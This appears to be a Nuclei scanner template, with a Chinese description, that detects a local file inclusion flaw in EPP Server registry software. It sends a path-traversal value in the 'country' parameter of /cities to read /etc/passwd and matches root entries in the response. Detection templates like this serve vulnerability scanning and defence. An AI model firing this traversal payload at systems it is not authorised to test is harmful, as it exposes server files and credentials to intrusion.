id: epp-server-lfi

info:
  name: EPP Server - 本地文件包含漏洞
  author: DhiyaneshDK
  severity: high
  description: EPP Server - 本地文件包含 存在本地文件包含漏洞。攻击者可借此读取服务器本地敏感文件、配置凭证或应用源码，为进一步入侵提供条件。
  reference:
    - https://hackcompute.com/hacking-epp-servers/
  metadata:
    max-request: 1
  tags: epp,cocca,registry,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/cities?country=/../../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: word
        part: header
        words:
          - application/json

      - type: status
        status:
          - 200
